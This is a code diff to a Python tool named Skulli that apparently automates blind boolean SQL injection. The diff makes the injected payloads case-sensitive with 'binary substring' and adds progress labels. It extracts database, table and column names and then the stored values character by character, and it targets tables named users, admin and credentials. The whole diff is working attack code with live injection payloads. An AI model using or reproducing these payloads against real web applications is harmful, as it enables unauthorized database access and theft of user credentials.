@@ -61,7 +61,6 @@ class Skulli:
             print(e)
         
     def set_options(self,options):
-        # bad_words = ['mysql','information_schema', 'schema', 'sys']
         list_options = options.split(',')
         good_words = ['users', 'login', 'register', 'admin', 'administrator', 'database', 'credentials','clients','usuarios','credenciales']
         
@@ -118,7 +117,7 @@ class Skulli:
 
         for pos in range(1,db_len + 1):
             for char in self.characters:
-                payload = f"' or substring((select group_concat(schema_name) from information_schema.schemata),{pos},1)='{char}'-- -"
+                payload = f"' or binary substring((select group_concat(schema_name) from information_schema.schemata),{pos},1)='{char}'-- -"
                 self.data[self.skll] += payload
 
                 if self.method == 'post':
@@ -157,11 +156,11 @@ class Skulli:
 
     def get_tables(self, tb_len, db):
         tables = ''
-        p2 = log.progress('Tables')
+        p2 = log.progress(f'Tables ({db})')
 
         for pos in range(1,tb_len + 1):
             for char in self.characters:
-                payload = f"' or substring((select group_concat(table_name) from information_schema.tables where table_schema=\'{db}\'),{pos},1)='{char}'-- -"
+                payload = f"' or binary substring((select group_concat(table_name) from information_schema.tables where table_schema=\'{db}\'),{pos},1)='{char}'-- -"
                 self.data[self.skll] += payload
 
                 if self.method == 'post':
@@ -200,11 +199,11 @@ class Skulli:
 
     def get_columns(self, cl_len, db, table):
         columns = ''
-        p2 = log.progress('Columns')
+        p2 = log.progress(f'Columns ({db})->({table})')
 
         for pos in range(1,cl_len + 1):
             for char in self.characters:
-                payload = f"' or substring((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'),{pos},1)='{char}'-- -"
+                payload = f"' or binary substring((select group_concat(column_name) from information_schema.columns where table_schema=\'{db}\' and table_name=\'{table}\'),{pos},1)='{char}'-- -"
                 self.data[self.skll] += payload
 
                 if self.method == 'post':
@@ -243,11 +242,12 @@ class Skulli:
 
     def get_values(self, vl_len, db, table, columns):
         values = ''
-        p2 = log.progress('Values')
+        parse_columns = columns.replace(',0x3a,', ',')
+        p2 = log.progress(f'Values ({db})->({table})->({parse_columns})')
 
         for pos in range(1,vl_len + 1):
             for char in self.characters:
-                payload = f"' or substring((select group_concat({columns}) from {db}.{table}),{pos},1)='{char}'-- -"
+                payload = f"' or binary substring((select group_concat({columns}) from {db}.{table}),{pos},1)='{char}'-- -"
                 self.data[self.skll] += payload
 
                 if self.method == 'post':
@@ -281,7 +281,7 @@ class Skulli:
         print('\n')
 
         columns = self.get_columns(self.get_columns_len(database,table), database, table)
-        columns = columns.replace(',', ",':',")
+        columns = columns.replace(',', ",0x3a,")
         # #print(columns)
 
         print('\n')
